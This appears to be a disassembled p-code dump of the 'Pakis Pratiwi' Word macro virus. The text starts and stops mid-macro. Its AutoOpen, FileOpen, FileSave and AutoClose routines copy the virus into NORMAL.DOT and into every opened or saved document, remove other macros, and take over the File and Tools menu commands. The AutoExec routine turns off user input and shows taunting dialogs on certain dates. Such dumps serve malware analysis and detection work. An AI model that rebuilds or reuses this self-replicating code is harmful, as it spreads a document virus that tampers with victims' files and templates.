' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #33:
' 	Label Pratiwi 
' Line #34:
' 	EndSub 
' Macros/VBA/PakisPratiwiAutoClose - 2363 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Intan
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn MN
' Line #5:
' 	OptionBase 
' 	LitDI2 0x0014 
' 	Redim Fransiska__$ 0x0001 (As String)
' Line #6:
' 	LitDI2 0x0000 
' 	St Intan 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #8:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MN$ 
' Line #9:
' 	Ld MN$ 
' 	Ld i 
' 	ArgsSt Fransiska__$ 0x0001 
' Line #10:
' 	Ld Intan 
' 	LitDI2 0x0001 
' 	Add 
' 	St Intan 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld Intan 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Intan 
' 	For 
' Line #14:
' 	Ld i 
' 	ArgsLd Fransiska__$ 0x0001 
' 	LitStr 0x0008 "FileOpen"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Pakis 
' 	EndIf 
' Line #15:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Pratiwi 
' Line #16:
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	LitStr 0x000A "NORMAL.DOT"
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd Fransiska__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #17:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Pratiwi 
' Line #18:
' 	LitStr 0x001B "Global:PakisPratiwiFileOpen"
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Label Pakis 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Label Pratiwi 
' Line #23:
' 	EndSub 
' Macros/VBA/PakisPratiwiFileSave - 3150 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn NFile
' Line #3:
' 	Dim 
' 	VarDefn NMakro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Pratiwi 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #6:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #10:
' 	Ld NFile$ 
' 	LitStr 0x0012 ":SweetPakisPratiwi"
' 	Add 
' 	St NMakro$ 
' Line #11:
' 	LitStr 0x0018 "Global:SweetPakisPratiwi"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoExec"
' 	Add 
' 	St NMakro$ 
' Line #13:
' 	LitStr 0x001B "Global:PakisPratiwiAutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #15:
' 	LitStr 0x001B "Global:PakisPratiwiAutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #17:
' 	LitStr 0x001B "Global:PakisPratiwiAutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld NFile$ 
' 	LitStr 0x0016 ":PakisPratiwiAutoClose"
' 	Add 
' 	St NMakro$ 
' Line #19:
' 	LitStr 0x001C "Global:PakisPratiwiAutoClose"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileOpen"
' 	Add 
' 	St NMakro$ 
' Line #21:
' 	LitStr 0x001B "Global:PakisPratiwiFileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileSave"
' 	Add 
' 	St NMakro$ 
' Line #23:
' 	LitStr 0x001B "Global:PakisPratiwiFileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiFileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #25:
' 	LitStr 0x001D "Global:PakisPratiwiFileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	Ld NFile$ 
' 	LitStr 0x001A ":PakisPratiwiFileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #27:
' 	LitStr 0x0020 "Global:PakisPratiwiFileTemplates"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #29:
' 	LitStr 0x001D "Global:PakisPratiwiToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	Ld NFile$ 
' 	LitStr 0x001B ":PakisPratiwiToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #31:
' 	LitStr 0x0021 "Global:PakisPratiwiToolsCustomize"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #33:
' 	Label Pratiwi 
' Line #34:
' 	EndSub 
' Macros/VBA/PakisPratiwiFileOpen - 4358 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Intan
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn MN
' Line #5:
' 	Dim 
' 	VarDefn FN
' Line #6:
' 	Dim 
' 	VarDefn NFile
' Line #7:
' 	Dim 
' 	VarDefn NMakro
' Line #8:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #9:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Pratiwi 
' Line #12:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #13:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #14:
' 	OptionBase 
' 	LitDI2 0x0014 
' 	Redim Fransiska__$ 0x0001 (As String)
' Line #15:
' 	LitDI2 0x0000 
' 	St Intan 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #17:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MN$ 
' Line #18:
' 	Ld MN$ 
' 	Ld i 
' 	ArgsSt Fransiska__$ 0x0001 
' Line #19:
' 	Ld Intan 
' 	LitDI2 0x0001 
' 	Add 
' 	St Intan 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FN$ 
' Line #22:
' 	Ld Intan 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Intan 
' 	For 
' Line #24:
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld FN$ 
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd Fransiska__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #29:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed LockAnnot 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitDI2 0x0001 
' 	ParamNamed AddToMru 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitDI2 0x0000 
' 	ParamNamed RecommendReadOnly 
' 	LitDI2 0x0000 
' 	ParamNamed EmbedFonts 
' 	LitDI2 0x0000 
' 	ParamNamed NativePictureFormat 
' 	LitDI2 0x0000 
' 	ParamNamed FormsData 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x000A 
' Line #30:
' 	Ld NFile$ 
' 	LitStr 0x0012 ":SweetPakisPratiwi"
' 	Add 
' 	St NMakro$ 
' Line #31:
' 	LitStr 0x0018 "Global:SweetPakisPratiwi"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoExec"
' 	Add 
' 	St NMakro$ 
' Line #33:
' 	LitStr 0x001B "Global:PakisPratiwiAutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #34:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #35:
' 	LitStr 0x001B "Global:PakisPratiwiAutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #37:
' 	LitStr 0x001B "Global:PakisPratiwiAutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #38:
' 	Ld NFile$ 
' 	LitStr 0x0016 ":PakisPratiwiAutoClose"
' 	Add 
' 	St NMakro$ 
' Line #39:
' 	LitStr 0x001C "Global:PakisPratiwiAutoClose"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #40:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileOpen"
' 	Add 
' 	St NMakro$ 
' Line #41:
' 	LitStr 0x001B "Global:PakisPratiwiFileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #42:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileSave"
' 	Add 
' 	St NMakro$ 
' Line #43:
' 	LitStr 0x001B "Global:PakisPratiwiFileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #44:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiFileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #45:
' 	LitStr 0x001D "Global:PakisPratiwiFileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #46:
' 	Ld NFile$ 
' 	LitStr 0x001A ":PakisPratiwiFileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #47:
' 	LitStr 0x0020 "Global:PakisPratiwiFileTemplates"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #48:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #49:
' 	LitStr 0x001D "Global:PakisPratiwiToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #50:
' 	Ld NFile$ 
' 	LitStr 0x001B ":PakisPratiwiToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #51:
' 	LitStr 0x0021 "Global:PakisPratiwiToolsCustomize"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #52:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #53:
' 	Label Pratiwi 
' Line #54:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #55:
' 	EndSub 
' Macros/VBA/PakisPratiwiAutoOpen - 4345 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Intan
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn MN
' Line #5:
' 	Dim 
' 	VarDefn NFile
' Line #6:
' 	Dim 
' 	VarDefn NMakro
' Line #7:
' 	OptionBase 
' 	LitDI2 0x0014 
' 	Redim Fransiska__$ 0x0001 (As String)
' Line #8:
' 	LitDI2 0x0000 
' 	St Intan 
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Pratiwi 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #11:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MN$ 
' Line #12:
' 	Ld MN$ 
' 	Ld i 
' 	ArgsSt Fransiska__$ 0x0001 
' Line #13:
' 	Ld Intan 
' 	LitDI2 0x0001 
' 	Add 
' 	St Intan 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	Ld Intan 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Intan 
' 	For 
' Line #17:
' 	Ld i 
' 	ArgsLd Fransiska__$ 0x0001 
' 	LitStr 0x0008 "FileOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Pakis 
' 	EndIf 
' Line #18:
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	LitStr 0x000A "NORMAL.DOT"
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd Fransiska__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #19:
' 	Label Pakis 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #23:
' 	Ld NFile$ 
' 	LitStr 0x0012 ":SweetPakisPratiwi"
' 	Add 
' 	St NMakro$ 
' Line #24:
' 	Ld NMakro$ 
' 	LitStr 0x0018 "Global:SweetPakisPratiwi"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileSave"
' 	Add 
' 	St NMakro$ 
' Line #26:
' 	Ld NMakro$ 
' 	LitStr 0x001B "Global:PakisPratiwiFileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiFileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #29:
' 	Ld NMakro$ 
' 	LitStr 0x001D "Global:PakisPratiwiFileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' 	Ld NFile$ 
' 	LitStr 0x001A ":PakisPratiwiFileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #32:
' 	Ld NMakro$ 
' 	LitStr 0x0020 "Global:PakisPratiwiFileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	Ld NMakro$ 
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #34:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #35:
' 	Ld NMakro$ 
' 	LitStr 0x001D "Global:PakisPratiwiToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #37:
' 	Ld NFile$ 
' 	LitStr 0x001B ":PakisPratiwiToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #38:
' 	Ld NMakro$ 
' 	LitStr 0x0021 "Global:PakisPratiwiToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #39:
' 	Ld NMakro$ 
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #40:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoExec"
' 	Add 
' 	St NMakro$ 
' Line #41:
' 	Ld NMakro$ 
' 	LitStr 0x001B "Global:PakisPratiwiAutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #42:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #43:
' 	Ld NFile$ 
' 	LitStr 0x0016 ":PakisPratiwiAutoClose"
' 	Add 
' 	St NMakro$ 
' Line #44:
' 	Ld NMakro$ 
' 	LitStr 0x001C "Global:PakisPratiwiAutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #45:
' 	Ld NMakro$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #46:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #47:
' 	Ld NMakro$ 
' 	LitStr 0x001B "Global:PakisPratiwiAutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #48:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileOpen"
' 	Add 
' 	St NMakro$ 
' Line #49:
' 	Ld NMakro$ 
' 	LitStr 0x001B "Global:PakisPratiwiFileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #50:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #51:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #52:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileOpen"
' 	Add 
' 	St NMakro$ 
' Line #53:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #54:
' 	Label Pratiwi 
' Line #55:
' 	EndSub 
' Macros/VBA/PakisPratiwiAutoExec - 5974 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Tgl
' Line #3:
' 	Dim 
' 	VarDefn Bln
' Line #4:
' 	Dim 
' 	VarDefn Thn
' Line #5:
' 	Dim 
' 	VarDefn Jam
' Line #6:
' 	Dim 
' 	VarDefn Lebar
' Line #7:
' 	Dim 
' 	VarDefn Tinggi
' Line #8:
' 	Dim 
' 	VarDefn BarOK
' Line #9:
' 	Dim 
' 	VarDefn LebOK
' Line #10:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	St Tgl 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	St Bln 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Year 0x0001 
' 	St Thn 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Hour 0x0001 
' 	St Jam 
' Line #16:
' 	Dim 
' 	VarDefn Tiwi1
' 	VarDefn Tiwi2
' 	VarDefn Tiwi3
' 	VarDefn Tiwi4
' 	VarDefn Pelaku
' 	VarDefn Pakis
' Line #17:
' 	LitStr 0x0020 "Berawal dari sebuah kepedihan..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0020 "Aku dicampakkan dan dihinakan..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0021 "Terpuruk bagaikan sampah busuk..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "Aku merintih..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0026 "   ( dengan segumpal dendam mendidih )"
' 	Add 
' 	St Tiwi1$ 
' Line #18:
' 	LitStr 0x001F "Kini saatnya Aku menunjukkan..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F "Masih adanya sebuah kekuatan..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0029 "Membungkam mulut-mulut tak berperasaan..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002A "Sebab hasrat untuk menjadi yang terbaik..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0027 "Adalah sesuatu yang sangat manusiawi..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002A "Aku menangis harus melibatkan semua orang."
' 	Add 
' 	St Tiwi2$ 
' Line #19:
' 	LitStr 0x0026 "©1997 Aku ( yang selalu terpuruk ... )"
' 	St Tiwi3$ 
' Line #20:
' 	LitStr 0x000D "Pakis Pratiwi"
' 	St Pakis$ 
' Line #21:
' 	Ld Thn 
' 	LitDI2 0x07CE 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo Fransiska 
' 	EndIf 
' Line #22:
' 	Ld Jam 
' 	LitDI2 0x0013 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo Pratiwi 
' 	EndIf 
' Line #23:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #24:
' 	LitDI2 0x0190 
' 	St Lebar 
' Line #25:
' 	LitDI2 0x00C8 
' 	St Tinggi 
' Line #26:
' 	Ld Tinggi 
' 	LitDI2 0x0019 
' 	Sub 
' 	St BarOK 
' Line #27:
' 	Ld Lebar 
' 	LitDI2 0x0028 
' 	Sub 
' 	St LebOK 
' Line #28:
' 	Ld Lebar 
' 	Ld Tinggi 
' 	LitStr 0x0021 " Come to where the fucker is ... "
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #29:
' 	LitDI2 0x0014 
' 	LitDI2 0x000A 
' 	Ld LebOK 
' 	LitDI2 0x0096 
' 	Ld Tiwi1$ 
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #30:
' 	LitDI2 0x0014 
' 	LitDI2 0x004E 
' 	Ld LebOK 
' 	LitDI2 0x0078 
' 	Ld Tiwi2$ 
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #31:
' 	LitDI2 0x0014 
' 	LitDI2 0x00A0 
' 	Ld LebOK 
' 	LitDI2 0x0014 
' 	Ld Tiwi3$ 
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #32:
' 	LitDI2 0x0014 
' 	Ld BarOK 
' 	Ld LebOK 
' 	LitDI2 0x0014 
' 	Ld WordBasic 
' 	ArgsMemCall OKButton 0x0004 
' Line #33:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #34:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #35:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall UserDialog 0x0001 
' Line #36:
' 	Label Fransiska 
' Line #37:
' 	Ld Tgl 
' 	LitDI2 0x0013 
' 	Eq 
' 	Ld Bln 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #38:
' 	Ld Pakis$ 
' 	St Pelaku$ 
' Line #39:
' 	GoTo Intan 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	GoTo Pakis_ 
' Line #42:
' 	Label Intan 
' Line #43:
' 	LitStr 0x0007 "Buat : "
' 	Ld Pelaku$ 
' 	Add 
' 	LitStr 0x0015 " ( dimanapun kamu ! )"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0013 "     Selamat ya !!!"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0018 "          Tambah umur..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001A "          Tambah dewasa..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0014 "     Tambah cakep..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0026 "Dari : Aku ( yang peduli sama kamu ! )"
' 	Add 
' 	St Tiwi4$ 
' Line #44:
' Line #45:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #46:
' 	Ld Tiwi4$ 
